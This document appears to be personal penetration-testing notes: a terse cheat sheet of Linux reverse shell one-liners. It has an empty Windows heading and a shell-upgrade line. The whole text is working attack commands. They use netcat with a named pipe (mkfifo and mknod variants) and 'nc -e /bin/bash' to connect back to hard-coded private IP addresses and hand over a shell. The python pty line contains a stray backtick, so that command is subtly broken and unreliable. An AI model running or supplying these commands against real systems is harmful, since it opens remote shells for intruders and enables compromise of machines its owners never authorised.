## Windows Reverse Shells




## Linux Reverse Shells

mkfifo /tmp/xspezn; nc 192.168.119.181 8080 0</tmp/xspezn | /bin/sh >/tmp/xspezn 2>&1; rm /tmp/xspezn

nc 192.168.1.1 4444 -e /bin/bash

netcat with no "e" present:

mknod /tmp/backpipe p 

/bin/sh 0</tmp/backpipe | nc 192.168.119.181 8080 1>/tmp/backpipe

**Upgrade Shells**

python -c 'import pty; pty.spawn("/bin/bash"`)'
